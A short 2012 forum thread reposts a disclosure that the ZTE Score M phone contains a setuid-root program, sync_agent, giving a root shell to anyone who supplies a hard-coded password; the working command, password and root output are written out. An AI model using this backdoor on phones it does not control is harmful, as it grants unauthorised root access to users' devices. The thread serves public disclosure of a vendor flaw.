## ZTE Score M default backdoor
Posted by **XlogicX** on Thu May 17th, 2012 03:38:13 AM

<!-- m --><a class="postlink" href="http://pastebin.com/wamYsqTV">http://pastebin.com/wamYsqTV</a><!-- m -->

Contents of the paste:

[code:3gdsead2]The ZTE Score M is an Android 2.3.4 (Gingerbread) phone available in the United States on MetroPCS, made by Chinese telecom ZTE Corporation.

There is a setuid-root application at /system/bin/sync_agent that serves no function besides providing a root shell backdoor on the device.  Just give the magic, hard-coded password to get a root shell:

$ sync_agent ztex1609523
# id
uid=0(root) gid=0(root)

Nice backdoor, ZTE.[/code:3gdsead2]

--------------------------------------------------------------------------------

Posted by **PHLAK** on Thu May 17th, 2012 02:26:39 PM

On the plus side, this makes rooting the phone much easier!
